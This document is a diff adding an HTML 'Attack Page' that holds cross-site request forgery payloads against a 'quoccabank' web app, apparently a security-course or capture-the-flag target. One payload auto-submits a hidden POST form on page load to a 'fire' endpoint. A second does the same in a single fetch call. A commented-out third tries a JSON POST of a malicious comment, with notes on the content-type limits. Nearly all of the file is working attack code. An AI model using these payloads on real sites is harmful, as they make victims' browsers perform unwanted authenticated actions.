@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <h1>Attack Page</h1>
+        <form id="myForm" action="https://layoffs.quoccabank.com/api/fire/melon" method="post"></form>
+
+        <script>
+            window.onload = function() {
+                document.getElementById("myForm").submit();
+            }
+        </script>
+    </body>
+</html>
+
+
+<!-- same as above, more concise, less clear-->
+<script>fetch('//layoffs.quoccabank.com/api/fire/kris',{method:'POST'})</script>
+
+
+<!--
+This works, except the req is being made from another site. 
+so content-type bexcomes x-www-form-urlencoded. we need it application/
+
+
+
+    <script>
+        async function postData() {
+            const response = await fetch('https://layoffs.quoccabank.com/api/comment', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({"content": "malicious_comment"}),
+            });
+
+            return response.json();
+        }
+
+        postData().then((data) => { console.log(data); });
+    </script>
+-->
